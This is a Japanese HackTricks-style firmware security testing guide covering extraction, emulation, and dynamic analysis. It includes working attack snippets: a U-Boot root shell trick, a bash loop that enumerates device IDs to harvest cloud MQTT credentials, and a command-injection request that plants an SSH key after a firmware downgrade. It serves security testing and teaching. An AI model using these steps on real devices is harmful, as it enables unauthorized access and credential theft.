# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

## **導入**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、デバイスがハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介することで、正しく動作するために必要なソフトウェアです。電源が入った瞬間から重要な命令にアクセスできるように、永続メモリに格納されており、OSの起動につながります。ファームウェアの解析や改変は、セキュリティ脆弱性を特定する上で重要なステップです。

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期ステップです。以下の情報を収集します：

- 実行されているCPUアーキテクチャとオペレーティングシステム
- ブートローダの詳細
- ハードウェア構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンス種別
- 更新履歴と規制認証
- アーキテクチャ図やフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**open-source intelligence (OSINT)** ツールが非常に有用であり、入手可能なオープンソースソフトウェアコンポーネントの手動および自動レビューによる分析も重要です。Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) は、潜在的な問題を検出するために活用できる無料の静的解析を提供します。

## **ファームウェアの入手**

ファームウェアの入手には、難易度の異なるさまざまな手法があります：

- **直接** ソース（開発者、製造元）から入手
- **ビルド** 提供された手順から構築
- **ダウンロード** 公式サポートサイトから取得
- ホストされているファームウェアファイルを見つけるための **Google dork** クエリの活用
- [S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールを使った **クラウドストレージ** への直接アクセス
- man-in-the-middle 技術による **アップデートの傍受**
- **UART**, **JTAG**, **PICit** のような接続を介したデバイスからの抽出
- デバイス通信内での更新要求を **スニッフィング**
- ハードコードされた更新エンドポイントの特定と利用
- ブートローダやネットワークからの **ダンプ**
- 最後の手段として、適切なハードウェアツールを用いてストレージチップを **取り外して読み取り**

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

これは、ブートローダのシェルが無効化されているが、外部フラッシュ経由でenvパーティションが書き込み可能な組み込みデバイスで有用です。

## 解析

firmwareを入手したので、それをどのように扱うかを判断するために情報を抽出する必要があります。これに使えるさまざまなツール：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしそれらのツールであまり見つからない場合は、`binwalk -E <bin>`でイメージの**entropy**を確認してください。entropyが低ければ暗号化されている可能性は低く、entropyが高ければ暗号化されている（または何らかの形でcompressed）可能性があります。

さらに、これらのツールを使って**files embedded inside the firmware**を抽出できます：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）でファイルを調査できます。

### ファイルシステムの取得

前述のツール（例: `binwalk -ev <bin>`）を使えば、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、それを**ファイルシステムの種類名で命名されたフォルダ**内に抽出します。一般的には以下のいずれかです: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手動でのファイルシステム抽出

場合によっては、binwalkのシグネチャにファイルシステムの**magic byte**が含まれていないことがあります。そのような場合は、binwalkでファイルシステムの**offsetを見つけてバイナリからcompressed filesystemをcarve**し、以下の手順に従ってタイプに応じて**手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
次の **dd command** を実行して Squashfsファイルシステムをcarvingしてください。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
代替として、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

ファイルはその後、"`squashfs-root`" ディレクトリに置かれます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、ファームウェアイメージから有用なデータを解析・抽出するためのさまざまなツールを使用します。

### Initial Analysis Tools

バイナリファイル（以下 `<bin>` と呼ぶ）の初期検査のためのコマンド群を示します。これらのコマンドは、ファイルタイプの特定、文字列の抽出、バイナリデータの解析、パーティションやファイルシステムの詳細把握に役立ちます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するため、`binwalk -E <bin>` で **entropy** を確認します。entropy が低い場合は暗号化されていないことを示唆し、entropy が高い場合は暗号化または圧縮されている可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントやファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると通常はファイルシステムを抽出でき、多くの場合その種類名（例: squashfs, ubifs）のディレクトリに展開されます。しかし、magic bytes が欠落しているために **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これは `binwalk` でファイルシステムのオフセットを特定し、続けて `dd` コマンドでファイルシステムを切り出す操作を含みます:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムの種類（例: squashfs, cpio, jffs2, ubifs）に応じて、内容を手動で抽出するために異なるコマンドが使用される。

### ファイルシステム解析

ファイルシステムを抽出したら、セキュリティ上の欠陥の探索が始まる。insecure network daemons、ハードコードされた認証情報、API endpoints、update server 機能、未コンパイルのコード、起動スクリプト、およびオフライン解析のためのコンパイル済みバイナリに注意が払われる。

**重要な場所** と **項目**（検査対象）には次が含まれる:

- **etc/shadow** と **etc/passwd** （ユーザー認証情報）
- SSL 証明書と鍵（**etc/ssl**）
- 潜在的な脆弱性を含む設定ファイルやスクリプト
- さらなる解析のための埋め込みバイナリ
- 一般的な IoT デバイスの web サーバやバイナリ

ファイルシステム内の機密情報や脆弱性を発見するのに役立つツールには次がある:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker) — 機密情報の検索用
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — 包括的な firmware 解析向け
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), および [**EMBA**](https://github.com/e-m-b-a/emba) — 静的解析および動的解析向け

### コンパイル済みバイナリのセキュリティチェック

ファイルシステムで見つかったソースコードとコンパイル済みバイナリの両方を脆弱性について精査する必要がある。Unix バイナリ用の **checksec.sh** や Windows バイナリ用の **PESecurity** のようなツールは、悪用される可能性のある保護されていないバイナリを特定するのに役立つ。

## 派生した URL トークンを介した cloud config と MQTT 認証情報の取得

多くの IoT ハブは、デバイスごとの設定を次のような cloud エンドポイントから取得する:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` がハードコードされたシークレットを使ってデバイス ID からローカルに導出されていることが見つかる場合がある。例えば:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計により、deviceId と STATIC_KEY を知る者は誰でも URL を再構築して cloud config を取得できるようになり、しばしば平文の MQTT 認証情報やトピックプレフィックスが露出する。

実用的なワークフロー:

1) UART ブートログから deviceId を抽出する

- 3.3V の UART アダプタ (TX/RX/GND) を接続してログを取得する:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern と broker address を出力している行を探す。例えば:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) ファームウェアから STATIC_KEY とトークンアルゴリズムを抽出する

- バイナリを Ghidra/radare2 に読み込み、設定パス ("/pf/") や MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash でトークンを導出し、ダイジェストを大文字化する：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) クラウド設定と MQTT 認証情報を収集

- URL を作成し、curl で JSON を取得; jq で解析してシークレットを抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文の MQTT と弱い topic ACLs を悪用する（存在する場合）

- recovered credentials を使って maintenance topics に subscribe し、機密性の高いイベントを探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能なデバイスIDを列挙する（大規模に、認可のもとで）

- 多くのエコシステムでは、ベンダー OUI/product/type バイトに続いて連番サフィックスが埋め込まれている。
- 候補IDを反復し、トークンを導出してプログラムで設定を取得できる：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- mass enumeration を試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、ターゲットハードウェアを変更せずに secrets を回復するために emulation または static analysis を優先してください。

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### 個別バイナリのエミュレーション

単一のプログラムを調査する場合、プログラムの endianness と CPU architecture を特定することが重要です。

#### MIPS アーキテクチャの例

MIPS アーキテクチャのバイナリをエミュレートするには、次のコマンドを使用します:
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS（ビッグエンディアン）, `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARMアーキテクチャのエミュレーション

ARMバイナリでも手順は同様で、`qemu-arm` エミュレータを使用してエミュレーションを行います。

### フルシステムエミュレーション

[ Firmadyne ](https://github.com/firmadyne/firmadyne)や[ Firmware Analysis Toolkit ](https://github.com/attify/firmware-analysis-toolkit)などのツールはフルファームウェアのエミュレーションを支援し、プロセスの自動化や動的解析を補助します。

## 実践における動的解析

この段階では、実機またはエミュレートされたデバイス環境のいずれかを用いて解析を行います。OSとファイルシステムへのシェルアクセスを維持することが重要です。エミュレーションはハードウェアの相互作用を完全には再現しない場合があるため、エミュレーションの再起動が必要になることがあります。解析ではファイルシステムを再確認し、公開されたウェブページやネットワークサービスを突き、ブートローダの脆弱性を調査してください。ファームウェアの整合性テストは、バックドアの可能性を特定するために重要です。

## ランタイム解析の手法

ランタイム解析では、プロセスやバイナリをその実行環境内で操作し、ブレークポイント設定や脆弱性の発見のために gdb-multiarch、Frida、Ghidra といったツールを使用します。ファジングなどの手法も用いられます。

組み込みターゲットで完全なデバッガがない場合は、**スタティックリンクされた `gdbserver` をデバイスにコピーしてリモートでアタッチします:**
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

識別された脆弱性の PoC を作成するには、ターゲットアーキテクチャの深い理解と低レベル言語でのプログラミングが必要です。組み込みシステムではバイナリのランタイム保護は稀ですが、存在する場合は Return Oriented Programming (ROP) のような手法が必要になることがあります。

### uClibc fastbin exploitation notes (組み込み Linux)

- **Fastbins + consolidation:** uClibc は glibc と同様の fastbins を使用します。後続の大きな割り当てで `__malloc_consolidate()` が発生する可能性があるため、偽のチャンクはチェック（妥当なサイズ、`fd = 0`、および周囲のチャンクが "in use" と見なされること）を通過する必要があります。
- **Non-PIE binaries under ASLR:** ASLR が有効でもメインバイナリが **non-PIE** の場合、バイナリ内の `.data/.bss` アドレスは固定されます。有効なヒープチャンクヘッダに既に似ている領域を狙い、fastbin の割り当てを **関数ポインタテーブル** に着地させることができます。
- **Parser-stopping NUL:** JSON を解析する際、ペイロード内の `\x00` によりパースが停止しつつ、後続の攻撃者制御下のバイトを保持してスタックピボット/ROP チェーンに利用できることがあります。
- **Shellcode via `/proc/self/mem`:** ROP チェーンで `open("/proc/self/mem")`、`lseek()`、`write()` を呼び出すことで、既知のマッピングに実行可能な shellcode を植え付けてそこにジャンプできます。

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は IoT デバイスのセキュリティ評価および penetration testing を支援することを目的としたディストリビューションです。必要なツールがすべてロードされたプリコンフィグ済み環境を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): EmbedOS は Ubuntu 18.04 ベースの組み込みセキュリティテスト用オペレーティングシステムで、ファームウェアセキュリティテストツールがプリロードされています。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

ベンダがファームウェアイメージに対して暗号署名チェックを実装していても、**version rollback (downgrade) protection がしばしば省略されている**ことがあります。ブートローダやリカバリローダが埋め込まれた公開鍵で署名のみを検証し、フラッシュされるイメージの *version*（または単調増加するカウンタ）を比較しない場合、攻撃者は正当に有効な署名を保持した**古い脆弱なファームウェア**をインストールして、修正された脆弱性を再導入することができます。

Typical attack workflow:

1. **Obtain an older signed image**
* ベンダの公開ダウンロードポータル、CDN、サポートサイトから入手する。
* コンパニオンのモバイル/デスクトップアプリから抽出する（例: Android APK の中の `assets/firmware/`）。
* VirusTotal、Internet archives、フォーラムなどのサードパーティリポジトリから取得する。
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くのコンシューマ向け IoT デバイスは、Base64 エンコードされたファームウェアブロブを受け取りサーバ側でデコードしてリカバリ/アップグレードをトリガする *unauthenticated* な HTTP(S) エンドポイントを公開しています。
3. ダウングレード後、より新しいリリースで修正された脆弱性を悪用します（例えば後から追加されたコマンドインジェクション対策フィルタなど）。
4. 必要に応じて最新のイメージに再フラッシュするか、永続化獲得後に検出を避けるためにアップデートを無効化します。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされることなくシェルコマンドに直接連結されており、任意のコマンド注入を可能にしている（ここでは SSH key-based root access を有効にする例）。後のファームウェアでは簡易的な文字フィルタが導入されたが、ダウングレード保護が無いためその修正は無意味になる。

### モバイルアプリからのファームウェア抽出

多くのベンダーは、コンパニオンモバイルアプリ内にデバイスを Bluetooth/Wi-Fi 経由で更新できるようにフルのファームウェアイメージを同梱している。これらのパッケージは通常、APK/APEX の `assets/fw/` や `res/raw/` のようなパスに暗号化されずに格納されている。`apktool`、`ghidra`、あるいは単に `unzip` のようなツールを使えば、物理ハードウェアに触れることなく署名済みイメージを抽出できる。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### アップデートロジック評価のチェックリスト

* アップデートの *update endpoint* のトランスポート/認証は十分に保護されていますか (TLS + authentication)？
* デバイスはフラッシュ前に **バージョン番号（version numbers）** または **単調増加のアンチロールバックカウンタ（monotonic anti-rollback counter）** を比較していますか？
* イメージはセキュアブートチェーン内で検証されていますか（例: ROMコードによる署名チェック）？
* ユーザーランド（userland）コードは追加のサニティチェックを行っていますか（例: 許可されたパーティションマップ、モデル番号）？
* *partial* や *backup* のアップデートフローは同じ検証ロジックを再利用していますか？

> 💡  上記のいずれかが欠けている場合、プラットフォームはおそらくロールバック攻撃に対して脆弱です。

## 演習用の脆弱なファームウェア

ファームウェアの脆弱性発見を練習するには、以下の脆弱なファームウェアプロジェクトを出発点として使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## トレーニングと認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## 参考

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
